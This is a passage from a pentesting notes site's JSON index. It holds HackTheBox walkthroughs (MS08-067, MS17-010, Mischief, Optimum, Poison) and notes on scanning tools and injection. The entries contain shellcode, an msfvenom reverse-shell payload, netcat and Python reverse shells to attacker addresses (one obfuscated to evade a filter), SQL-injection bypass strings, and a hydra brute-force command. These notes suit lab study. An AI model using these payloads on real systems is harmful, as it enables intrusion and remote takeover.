\u0026quot;\\x3b\\x4c\\x46\\x4c\\x7b\\xcd\\xdd\\xcf\\xa4\\x71\\x20\\x53\u0026quot; shellcode += \u0026quot;\\xdb\\xf4\\x60\\xf4\\xbd\\x83\\xb4\\xd9\\xae\\xa2\\x24\\x66\u0026quot;  windows support versions\nExample: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445 Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used) Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX) Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX) Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)  edited with vi q@a\nWindows XP SP0/SP1 Universal, port 445 Windows 2000 Universal, port 139 (445 could also be used) Windows 2003 SP0 Universal Windows 2003 SP1 English Windows XP SP3 French (NX) Windows XP SP3 English (NX) Windows XP SP3 English (AlwaysOn NX)  git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/ cd impacket pip install .  python ms08-067.py 10.10.10.4 6 445 nc -lvnp 443  MS-17-010\nclone the rep then run everything inside the repo so the python has access to the mysqm module.\nhttps://github.com/helviojunior/MS17-010.git  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_10.10.14.14_443.exe  python send_and_execute.py 10.10.10.4 rev_10.10.14.14_443.exe Trying to connect to 10.10.10.4:445 Target OS: Windows 5.1 Using named pipe: browser Groom packets attempt controlling next transaction on x86 success controlling one transaction modify parameter count to 0xffffffff to be able to write backward leak next transaction CONNECTION: 0x821f9638 SESSION: 0xe1ee5c18 FLINK: 0x7bd48 InData: 0x7ae28 MID: 0xa TRANS1: 0x78b50 TRANS2: 0x7ac90 modify transaction struct for arbitrary read/write make this SMB session to be SYSTEM current TOKEN addr: 0xe1f45b50 userAndGroupCount: 0x3 userAndGroupsAddr: 0xe1f45bf0 overwriting token UserAndGroups Sending file BURVZM.exe... Opening SVCManager on 10.10.10.4..... Creating service jOGJ..... Starting service jOGJ..... The NETBIOS connection with the remote host timed out. Removing service jOGJ..... ServiceExec Error on: 10.10.10.4 nca_s_proto_error Done  "
},
{
	"uri": "/hackthebox/challenges/",
	"title": "Miscellaneous",
	"tags": [],
	"description": "",
	"content": "Setting up Test Enviroment or Complicated tools.\n  \n  "
},
{
	"uri": "/hackthebox/boxes/mischief/",
	"title": "Mischief",
	"tags": [],
	"description": "",
	"content": " THIS IS A SUMMARY OF IPPSEC VIDEO \u0026amp; 0XDF GUIDE.\nwatch the ippsec video https://www.youtube.com/watch?v=GKo6xoB1g4Q\nread this guide https://0xdf.gitlab.io/2019/01/05/htb-mischief.html\nSummary, this box highlights securing ipv6. I would like to note the ipv6 address changes every reset so careful copy pasting.\nThe quality of the phpsession tokens is exellent damnit.\nNmap -v print output as it find it\n-max-retries 0 \u0026lt;\u0026ndash; save for later\n# Nmap 7.70 scan initiated Tue Jan 1 16:00:09 2019 as: nmap -sV -sC -p- -Pn -oA total -T5 10.10.10.92 Nmap scan report for 10.10.10.92 Host is up (0.14s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA) | 256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA) |_ 256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519) 3366/tcp open caldav Radicale calendar and contacts server (Python BaseHTTPServer) | http-auth: | HTTP/1.0 401 Unauthorized\\x0D |_ Basic realm=Test |_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1 |_http-title: Site doesn't have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TCP - connect 22/tcp open ssh 80/tcp open http 1857/tcp filtered datacaptor 2308/tcp filtered sdhelp 3465/tcp filtered edm-mgr-cntrl 3541/tcp filtered voispeed-port  UDP Not shown: 994 closed ports PORT STATE SERVICE VERSION 3/udp open|filtered tcpwrapped 80/udp open|filtered tcpwrapped 17219/udp open|filtered chipper 19193/udp open|filtered unknown 31625/udp open|filtered unknown 52225/udp open|filtered unknown  https://security.stackexchange.com/questions/23407/how-to-bypass-tcpwrapped-with-nmap-scan\n\u0026ldquo;tcpwrapped\u0026rdquo; refers to tcpwrapper, a host-based network access control program on Unix and Linux. When Nmap labels something tcpwrapped, it means that the behavior of the port is consistent with one that is protected by tcpwrapper. Specifically, it means that a full TCP handshake was completed, but the remote host closed the connection without receiving any data.\nSNMPWALK First to make it easier, install snmp-mibs-downloader a psuedo api. Instead of supplying the string of numbers supply something easier to to understand.\nhttps://0xdf.gitlab.io/2019/01/05/htb-mischief.html#tool-setup\nMessed up here to blindsided did n\u0026rsquo;t fully enumerate snmp. Theres a huge oid list interesting ones will let you read system processes\nOID REFERENCE\nsnmpwalk -v 2c -c public 10.10.10.92 ipAddressTable\nsnmpwalk -v 2c -c public 10.10.10.92 1.3.6.1.2.1.4.34.1.3.2\nsnmpwalk -v 2c -c public 10.10.10.92 hrSWRunTable\nsnmpwalk -v 2c -c public 10.10.10.92 1.3.6.1.2.1.25.4.2\nsnmpwalk -v 2c -c public 10.10.10.92 hrSWRunTable | grep loki\nHOST-RESOURCES-MIB::hrSWRunParameters.601 = STRING: \u0026ldquo;-c /home/loki/hosted/webstart.sh\u0026rdquo; HOST-RESOURCES-MIB::hrSWRunParameters.609 = STRING: \u0026ldquo;/home/loki/hosted/webstart.sh\u0026rdquo; HOST-RESOURCES-MIB::hrSWRunParameters.619 = STRING: \u0026ldquo;-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki \u0026ndash;dir /home/loki/hosted/\u0026rdquo;\nsnmpwalk -c public -v2c 10.10.10.92 | tee snmpwalk-mib.out\ntee prints the output as it goes\nCREDS\nUser: loki Pass: godofmischiefisloki\nIPV6 ADDRESS\niso.3.6.1.2.1.4.34.1.3.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 1 iso.3.6.1.2.1.4.34.1.3.2.16.222.173.190.239.0.0.0.0.2.80.86.255.254.143.244.163 = INTEGER: 2 iso.3.6.1.2.1.4.34.1.3.2.16.254.128.0.0.0.0.0.0.2.80.86.255.254.143.244.163 = INTEGER: 2\nssh into another box on the htb you can do the link local address ipv6 has a link local and routerable addr if your on the same layer 2 link you can access it.\nENYX but a python enyx.py 2c public 10.10.10.92\n[+] Snmpwalk found. [+] Grabbing IPv6. [+] Loopback -\u0026gt; 0000:0000:0000:0000:0000:0000:0000:0001 [+] Unique-Local -\u0026gt; dead:beef:0000:0000:0250:56ff:fe8f:f4a3 [+] Link Local -\u0026gt; fe80:0000:0000:0000:0250:56ff:fe8f:f4a3\nBruteForcing Community Strings\nupdate onesixtyone\nonesixtyone -c /seclist/common-snmp addr ./onesixtyone -c /opt/htb/wordlist/seclist /Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.92 Scanning 1 hosts, 122 communities 10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64  Second set of credentials user: loki | Pass: trickeryanddeceit\nroot@kali:~/hackthebox/mischief-10.10.10.92# curl -s -6 -X POST \u0026quot;http://[dead:beef::250:56ff:feb2:7cff]:80/\u0026quot; -H \u0026quot;Cookie: PHPSESSID=697rbtjrbikamspvck4p3u309d\u0026quot; -d \u0026quot;command=nc\u0026quot;  GOBUSTER /login.php (Status: 200) /assets (Status: 301) /index.php (Status: 200) /database.php (Status: 200) /logout.php (Status: 302\nwfuzz -hl 28 -c -b \u0026ldquo;PHPSESSID=je830qer33ef3jvs3h140o2n8t\u0026rdquo; -w /opt/htb/wordlist/seclist/Discovery/Web-Content/burp-parameter-names.txt -u \u0026ldquo;http://loki.htb/login.php?FUZZ=whoami\u0026quot;\nwfuzz -c -b \u0026ldquo;PHPSESSID=je830qer33ef3jvs3h140o2n8t\u0026rdquo; -w /opt/htb/wordlist/seclist/Fuzzing/Command-Injection-commix.txt -u \u0026ldquo;http://loki.htb/login.php?login=FUZZ\u0026quot;\nwfuzz \u0026ndash;hw 32 -c -b \u0026ldquo;PHPSESSID=je830qer33ef3jvs3h140o2n8t\u0026rdquo; -w /opt/htb/wordlist/seclist/Fuzzing/LFI-JHADDIX.txt -u \u0026ldquo;http://loki.htb/assets/FUZZ\u0026quot;\nSQL perhaps submit query when submiting the creds at the login page are vulnerable to sql injection\nhttp://www.securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html\n'or\u0026quot;=' ') or true-- ') or ('')=(' ') or 1-- ') or ('x')=('  The big mistake I made with wfuzz was not fuzzing POST request and only using GET request. I also missed allot of the snmpwalk hints.\nBAD wfuzz -hl 28 -c -b \u0026quot;PHPSESSID=je830qer33ef3jvs3h140o2n8t\u0026quot; -w /opt/htb/wordlist/seclist/Discovery/Web-Content/burp-parameter-names.txt -u \u0026quot;http://loki.htb/login.php?FUZZ=whoami\u0026quot;  GOOD wfuzz -c -w /opt/htb/wordlist/seclist/Discovery/Web-Content/burp-parameter-names.txt -d \u0026quot;FUZZ=junk\u0026quot; --hh 403 'http://loki.htb/'  OUTPUT 000207: C=200 20 L 35 W 436 Ch \u0026quot;command\u0026quot; 000546: C=200 20 L 31 W 403 Ch \u0026quot;left\u0026quot;  The supplied creds from the last webpage wont work in any combination. Using hydra to enumerate possible users, will return administrator. The password file should include both of the password from the previous steps (godofmischiefisloki, trickeryanddeceit), using Seclists top-usersnames-shortlist for the user enumeration.\nHYDRA hydra loki.htb -L /opt/htb/wordlist/seclist/Usernames/top-usernames-shortlist.txt -P passwords http-form-post \u0026quot;/login.php:user=^USER^\u0026amp;password=^PASS^:Sorry, those credentials do not match\u0026quot; user: administrator pass: trickeryanddeceit -L word list -P password - http-form-port the type of request after ^PASS^ notice : those are the parameter it will look for when it fails.  WebDev\nIt pipes user input into /dev/nul but it can only handle one command using two commands it will pipe the last to /dev/null and will execute the first line. credentials didn\u0026rsquo;t work because ls was strictly compared so any iterance of ls will be blacklisted\nippsec used rm netcat reverse shelll and to bypass the waf he used a question mark.\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.0.0.1 1234 \u0026gt;/tmp/f rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|n? 10.0.0.1 1234 \u0026gt;/tmp/f it wont allow ipv4 so have to also use -6 switch and use ipv6 addr rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|n? -6 dead:beef:2::100c 9056 \u0026gt;/tmp/f  So this is from 0xdf guide, save this for a later ctf.\n#/bin/bash #// variable command_file=$1 #// for each command in file do curl cmd for cmd in $(cat ${command_file}); do curl -s -6 -X POST \u0026quot;http://[dead:beef::250:56ff:feb2:7cff]:80/\u0026quot; -H \u0026quot;Cookie: PHPSESSID=697rbtjrbikamspvck4p3u309d\u0026quot; -d \u0026quot;command=${cmd}\u0026quot; | grep -q \u0026quot;Command is not allowed.\u0026quot; #// if the previous command returns one if true. #// (grep) -e regex -q quiet...suppress all normal output #// $? is the exit code from the previous command. so in this case,grep #// grep returns 1 if it doesn't find the string you're looking for if [ $? -eq 1 ]; then #// echo -e \\e enable parsing of the escape sequences [49m deals with #// the Default background color echo -e \u0026quot;\\e[42m${cmd}\\e[49m allowed\u0026quot;; else echo -e \u0026quot;\\e[41m${cmd}\\e[49m blocked\u0026quot;; fi; done  This script sets two variables ip and cmd will ask for input allow us to test for different commands\ndead:beef::250:56ff:fe8f:f4a3\n#!/bin/bash ip=$1 cmd=$2 curl -s -6 -X POST \u0026quot;http://[${ip}]:80/\u0026quot; -d \u0026quot;command=${cmd};\u0026quot; | grep -F \u0026quot;\u0026lt;/html\u0026gt;\u0026quot; -A 10 | grep -vF -e \u0026quot;\u0026lt;/html\u0026gt;\u0026quot; -e \u0026quot;Command was executed succesfully!\u0026quot;  things to note escapes were added after quotes socket was change from ipv4 to 6 socket,AF_INET6\n./cmd.sh ipv6_addr_changeme \u0026ldquo;python -c \u0026lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\\\u0026ldquo;YOUR_IPV6_ADDR_CHANGEME\\\u0026ldquo;,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026ldquo;/bin/sh\\\u0026ldquo;,\\\u0026ldquo;-i\\\u0026ldquo;]);\u0026lsquo;\u0026rdquo;\nNetCat\nip addr |grep inet6 #// use the scope global address\nnc -nv \u0026ndash;listen Your_ipv6_addr 443\nLimited access with a www-data users. get the file called creds and assh into the box\nlokiisthebestnorsegod\nssh loki@10.10.10.92\nROOT\nSome files to check next time su isn\u0026rsquo;t available. /etc/pam.d/su handles authentication for su, next file access control lists (facl) getfacl.\nthree options for root first since loki can\u0026rsquo;t su but www-data can su. second use systemd-run to get a reverse shell as root using ipv6. just repeat the part up top enter su into the terminal and enter the password.\nhttps://0xdf.gitlab.io/2019/01/05/htb-mischief.html#option-1---use-www-data-shell\n"
},
{
	"uri": "/tools/portscanning/netcat/",
	"title": "NetCat PORT SCAN",
	"tags": [],
	"description": "",
	"content": "NetCat as a port scanner with a little bash foo. We can make bash script that will enumerate ports on a target. NetCat is common on Linux systems. So chances are high it will be available. UPDATE : I hate the out put from this script. it was originally a ip range scanner.\nfor ip in $(seq 1 254); do nc -zv -w 1 172.16.24.$ip 22 2\u0026gt;\u0026amp;1 \u0026gt; /tmp/nul | grep -v 'timed' \u0026amp; done   for ip in $(seq 1 1000); do nc -zv -w 1 10.0.0.2 $ip 2\u0026gt;\u0026amp;1 \u0026gt; /tmp/nul | grep -v 'timed' \u0026amp; done   nc -zv -w 1 172.17.0.2 8900-10000 2\u0026gt;\u0026amp;1 | grep succeeded!   "
},
{
	"uri": "/help/",
	"title": "Network Manager Down",
	"tags": [],
	"description": "Network Icon Disappeared",
	"content": "The weirdest glitch bug I\u0026rsquo;ve ever experienced I am not sure I how I deleted the icon but it disappeared I could no longer access the network manager. Well fix the problem and see how to get to the internet without the network manager.\nI\u0026rsquo;m not sure if completely removing the network manager is required but i purged it out.\n sudo apt-get purge network-manager  To gain internet access reset the dhclient on the network interface, your network card maybe not be named eth0.\nsudo dhclient eth0  Test your connection ping google.com\nping google.com  Install network manager\nsudo apt-get update \u0026amp;\u0026amp; sudo apt-get upgrade \u0026amp;\u0026amp; sudo apt-get install network-manager -y  "
},
{
	"uri": "/network-manager-down/",
	"title": "Network Manager Down",
	"tags": [],
	"description": "Network Icon Disappeared",
	"content": "The weirdest glitch bug I\u0026rsquo;ve ever experienced I am not sure I how I deleted the icon but it disappeared I could no longer access the network manager. Well fix the problem and see how to get to the internet without the network manager.\nI\u0026rsquo;m not sure if completely removing the network manager is required but i purged it out.\n sudo apt-get purge network-manager  To gain internet access even though the network manager is down and isn\u0026rsquo;t connected. Doesn\u0026rsquo;t mean your screwed. Rest the dhclient on the network interface, your network card maybe not be named eth0.\nsudo dhclient eth0  Test your connection ping google.com\nping google.com  Install network manager\nsudo apt-get update \u0026amp;\u0026amp; sudo apt-get upgrade \u0026amp;\u0026amp; sudo apt-get install network-manager -y  "
},
{
	"uri": "/tools/nmap/",
	"title": "Nmap",
	"tags": [],
	"description": "",
	"content": "tcp connect its quicker and might discover some hidden services\nnmap -sT -p- -Pn -T5 nmap/initial ip_addr  Next move to targeted nmap scans.\n"
},
{
	"uri": "/tools/portscanning/nmap/",
	"title": "Nmap",
	"tags": [],
	"description": "",
	"content": "Nmap is a port scanning tool that can enumerate devices operating systems and even run scripts that intrusive. Allot of tools have a wide range of abilities but specialize at one thing. Nmap uses ping sweeps and a lot of math to figure everything out. For example based ping time to live, you can figure out the operating system based on how lit takes to handle the information ~128 windows ~64 Linux.\nnmap -sC -sV -Pn -p- -oA total-nightmare -T3 10.10.10.6\nnmap -sT -vv -oA total-nightmare -T3 10.10.10.6 TCP CONNECT nmap -sU -p- -oA total-UDP-nightmare -T3 10.10.10.6 UDP SCAN -sC: equivalent to \u0026ndash;script=default\n-sV: Probe open ports to determine service/version info\n-Pn: Treat all hosts as online \u0026ndash; skip host discovery ​ nmap -v -iR 10000 -Pn -p 80\n-p port ranges : Only scan specified ports ​ Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 \u0026ndash;exclude-ports port ranges : Exclude the specified ports from scanning\n-p- Scan 1 to 65000 ports\n-T1 1 through 5 it\u0026rsquo;s not recommended to run 5\nExample Nmap 7.70 scan initiated Sun Dec 2 14:12:17 2018 as: nmap -sC -sV -Pn -p- -oA total-nightmare -T5 10.10.10.6` `Nmap scan report for 10.10.10.66` `Host is up (0.14s latency).` `Not shown: 65533 filtered ports` \u0026lt;div class=\u0026quot;notices note\u0026quot; \u0026gt;\u0026lt;p\u0026gt;\u0026lt;code\u0026gt;PORT STATE SERVICE VERSION\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;80/tcp open http Apache httpd 2.4.18 ((Ubuntu))\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| http-cookie-flags:\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| /:\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| PHPSESSID:\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;|_ httponly flag not set\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;|_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: NOTES\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;2222/tcp open ssh (protocol 2.0)\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| fingerprint-strings:\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| NULL:\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;|_ SSH-2.0-OpenSSH 32bit (not so recent ver)\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| ssh-hostkey:\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| 1024 e2:71:84:5d:ed:07:89:98:68:8b:6e:78:da:84:4c:b5 (DSA)\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| 2048 bd:1c:11:9a:5b:15:d2:f6:28:76:c3:40:7c:80:6d:ec (RSA)\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| 256 bf:e8:25:bf:ca:92:55:bc:ca:a4:96:c7:43:d0:51:73 (ECDSA)\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;|_ 256 6f:14:30:b1:39:47:54:b7:5a:01:be:96:2c:a7:96:58 (ED25519)\u0026lt;/code\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; `1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :` `SF-Port2222-TCP:V=7.70%I=7%D=12/2%Time=5C042F3B%P=x86_64-pc-linux-gnu%r(NU` `SF:LL,2B,\u0026quot;SSH-2\\.0-OpenSSH\\x2032bit\\x20\\(not\\x20so\\x20recent\\x20ver\\)\\r\\n\u0026quot;` `SF:);` `Service detection performed. Please report any incorrect results at https://nmap.org/submit/`   "
},
{
	"uri": "/concepts/webapppentest/osinjcmd/",
	"title": "OS Command Injection",
	"tags": [],
	"description": "",
	"content": "No, probably not what your thinking. I’m talking about web app pen-testing. A lot of programming languages are vulnerable, to command injection via webpage. The user supplies OS commands that are escaped and executed. This is due to not properly sanitizing user input or elements aren’t hard coded allowing for exploitation. Below are the characters to sanitize.\n| \u0026amp;\u0026amp; … ; `(tilda) \u0026gt; \u0026lt; \\ !  This vulnerability can occur by using as owsp puts it Dangerous API, or using system commands inside a script that handles users supplied input.\nPHP system exec eval shell_exec ASP.NET HttpRequest.Params HttpRequest.Url HttpRequest.Item EXAMPLES hackthebox.eu/index.php?exec=ls index.php?shell_exec=c3ViMmlw;ls index.php?shell_exec=c3ViMmlw||ls POST request tester=c3ViMmlw|ls tester=c3ViMmlw||ls tester=c3ViMmlw;ls tester2=c3ViMmlw\u0026amp;\u0026amp;ls \u0026lt; -- in some scenario you'll need to encode theses values  Common system commands functions\ncmd=junk command=junk exec=junk  FOR MORE INFORMATION PLEASE FOLLOW THESES LINKS\nhttps://null-byte.wonderhowto.com/how-to/use-command-injection-pop-reverse-shell-web-server-0185760/\nTesting for Command Injection (OTG-INPVAL-013) - OWASP *OS command injection is a technique used via a web interface in order to execute OS commands on a web server. The user…*www.owasp.org\nhttps://www.owasp.org/index.php/Command_Injection\n"
},
{
	"uri": "/hackthebox/boxes/optimum/",
	"title": "Optimum",
	"tags": [],
	"description": "",
	"content": "NMAP\nnmap -sV -sC 10.10.10.8 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-25 00:19 EST Nmap scan report for 10.10.10.8 Host is up (0.042s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.89 seconds  SEARCHSPLOIT\nsearchsploit hfs --------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) --------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Apple Mac OSX 10.4.8 - DMG HFS+ DO_HFS_TRUNCATE Denial of Service | exploits/osx/dos/29454.txt Apple Mac OSX 10.6 - HFS FileSystem (Denial of Service) | exploits/osx/dos/12375.c Apple Mac OSX 10.6.x - HFS Subsystem Information Disclosure | exploits/osx/local/35488.c Apple Mac OSX xnu 1228.x - 'hfs-fcntl' Kernel Privilege Escalation | exploits/osx/local/8266.txt FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution | exploits/windows/remote/37985.py Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service | exploits/linux/dos/28895.txt Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit) | exploits/windows/remote/34926.rb Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities | exploits/windows/remote/31056.py Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload | exploits/multiple/remote/30850.txt Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1) | exploits/windows/remote/34668.txt Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) | exploits/windows/remote/39161.py Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution | exploits/windows/webapps/34852.txt --------------------------------------------------------------------------------------------------------------------- ----------------------------------------  "
},
{
	"uri": "/concepts/webapppentest/phptypejuggling/",
	"title": "PHP Typw Juggling",
	"tags": [],
	"description": "",
	"content": "PHP Type Juggling\nThis article will cover PHP type juggling, and some different ways i have encountered it on hackthebox .\nPHP has two comparisons; loose (==, =!) and strict (=\\==). Strict comparison 1 = 1, but in loose 1 could mean many things 1 could equal true or 1. Meaning that there multiple meaning for the values used. This is a built in feature for PHP to force type conversion into specific data type.\nPHP loose comparison does this to accommodate different data types for example; ‘9’ is different from 9. Adding the two data types in PHP will result in 18. In other languages like python will not accommodate such errors. PHP does this so the program might run as it was expected to. Accommodating human errors. Below are some examples of loose comparison.\n'0e1234' == '0e4321' '0e1234' == '0' '0e1234' \u0026lt;= '1' '0xf' == '15' #0xf in hexadecimal notation is 15  when php compares a string to a interger it has some weird quirks.\n'000...000' == int(0) '0e0...000' == int(0) '1e0...000' == int(1) 'abc...000' == int(0) # if a string starts with a non numerical character it will default to int(0)  Another example is when PHP try’s to interpreter a string and its converted into PHP exponential notation 0e⁰²³⁴²⁶²³⁴²²⁴¹²⁵¹⁶⁷⁸⁹ 0e²³⁴²⁶²³⁴²²⁴¹²⁵¹⁶⁷⁸⁹ equates to int(0) as well. If the number after the first letter is 0 it will remove the leading zero.\nIn the above examples the entire string is converted into a numerical value, or something completely different. Confusing I know but here are some popular charts that show how loose comparison works.\nThe Encounters\nphpsession, cookies, \u0026amp; passwords are susceptible to PHP type juggling. Allowing the attacker to take advantage of a PHP feature to gain access to valid user accounts. From what I have read, the attacker randomly generates cookies. Trying to predict the next cookie. The more random(entropy) the targets cookies have, the harder it is to preform this attack.\nIn the below example, PHP will convert both of the md5 hashes into integers. It will then compare the two values based on the integer. Even though the two hash are different they are both treated as value.\nsubmited cookie aa6fw…34tj4343 = 0 stored cookie ff6dj..w221.5885m = 0  This is also applicable to PHP authentication\nstored password e0rj238r submited password e0mfwewl  References:\nhttps://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing https://0xdf.gitlab.io/2018/06/23/htb-falafel.html#php-type-juggling-intro https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/ https://www.whitehatsec.com/blog/magic-hashes/  "
},
{
	"uri": "/hackthebox/boxes/poison/",
	"title": "Poison",
	"tags": [],
	"description": "",
	"content": "PHASE 1 NMAP\nnmap -sC -sV -Pn -oA initial_poison 10.10.10.84  port 22 ssh it can be a rabbit-hole.\nport 80 webpage apache 2.4.29 (FreeBSD) PHP/ 5.6.32\nport 514 hmm\nPHASE 2 LFI\nManually inspect the webpage this is kind of tedious. As you’ll have to investigate the PHP scripts one by one. listfiles.php has an interesting new piece of information. Go back to the default webpage and enter PWDBACKUP.TXT.\nnext step you will have to decode this secure password.txt. I’d like to note that md5(TMOBILE …COUGH), base64 are not encryption algorithms because it lacks a key. I used Cyberchef to decode the message 13 times. The interface for Cyberchef made it easy. tool — https://gchq.github.io/CyberChef/\nCharix!2#4%6\u0026amp;8(0\nPHASE 3 SSH :🤣\nThis time it wasn’t a rabbit hole. Lady luck was on our side as the developer left those passwords out and about. Have to guess what the username is. It’s not poison, after a while, I got it right charix is the username.\nsecret.zip user.txt  Need to move secret.zip off of the machine to unzip the file gzip isn’t available on the machine. YOU WILL NEED TO CHANGE READ PERMISSIONS\npython3 -m http.server 8081 wget http://10.10.10.84:8081/secret.zip chmod 400 secret  python may not always be available on the host.\nFile transfer for NetCat this tool will transfer a file to the other session the \u0026gt; overwrites the file your nc -l -p 8081 \u0026gt; directory_path fromt target nc 10.10.14.3 8081 \u0026gt; secret.zip  What is the point of secret? after banging my head for a while. I decided to just for the laughs and tried Netstat and see if any services were running. By George did I. WAIT//// WHAT THIS LOCALHOST, ARG!!!!!!\nnetstat -na |grep -i LISTEN  PHASE 4 SSH AGAIN\nYeah, didn’t know this before this box but you can ssh into localhost.\nSSH port forwarding is a neat tool to get access to the Localhost through an ssh connection. Well, that’s what well be using it for. Source port would be for example 8080 destination port would 80 if you wanted to connect to a web server It could take 20 seconds for it to connect also nothing really happens. BE PATIENT!!!!!\n-L PORT1:IP: PORT2 tells ssh that you want it to listen on your host port PORT1. any traffic that comes to your host PORT1, send it through the ssh connection, and then from the host, you’re smashed into, send it from that host to IP:PORT2\nconcept\nthe juice. it’s a secret guess\nPHASE 5 FINALE\nport 5801 is associated with Vncviewer.\n"
},
{
	"uri": "/tools/portscanning/",
	"title": "PortScannings",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/tools/ssh/port-forwarding/",
	"title": "SHH Port Forwarding",
	"tags": [],
	"description": "",
	"content": "ssh port forwarding will create \u0026ldquo;tunnels\u0026rdquo; allowing access to the network on the host. examples would be using localhost,,or a private address.\nssh user@ip_addr -L LocalPort:address_ip:HostPort\n"
},
{
	"uri": "/tools/smb/smb/",
	"title": "SMB",
	"tags": [],
	"description": "",
	"content": "SMBCLIENT\nUsage: smbclient service \u0026lt;password\u0026gt; -R, --name-resolve=NAME-RESOLVE-ORDER Use these name resolution services only -M, --message=HOST Send message -I, --ip-address=IP Use this IP to connect to -E, --stderr Write messages to stderr instead of stdout -L, --list=HOST Get a list of shares available on a host -m, --max-protocol=LEVEL Set the max protocol level -T, --tar=\u0026lt;c|x\u0026gt;IXFqgbNan Command line tar -D, --directory=DIR Start from directory -c, --command=STRING Execute semicolon separated commands -b, --send-buffer=BYTES Changes the transmit/send buffer -t, --timeout=SECONDS Changes the per-operation timeout -p, --port=PORT Port to connect to -g, --grepable Produce grepable output -q, --quiet Suppress help message -B, --browse Browse SMB servers using DNS Help options: -?, --help Show this help message --usage Display brief usage message Common samba options: -d, --debuglevel=DEBUGLEVEL Set debug level -s, --configfile=CONFIGFILE Use alternate configuration file -l, --log-basename=LOGFILEBASE Base name for log files -V, --version Print version --option=name=value Set smb.conf option from command line Connection options: -O, --socket-options=SOCKETOPTIONS socket options to use -n, --netbiosname=NETBIOSNAME Primary netbios name -W, --workgroup=WORKGROUP Set the workgroup name -i, --scope=SCOPE Use this Netbios scope Authentication options: -U, --user=USERNAME Set the network username -N, --no-pass Don't ask for a password -k, --kerberos Use kerberos (active directory) authentication -A, --authentication-file=FILE Get the credentials from a file -S, --signing=on|off|required Set the client signing state -P, --machine-pass Use stored machine account password -e, --encrypt Encrypt SMB transport -C, 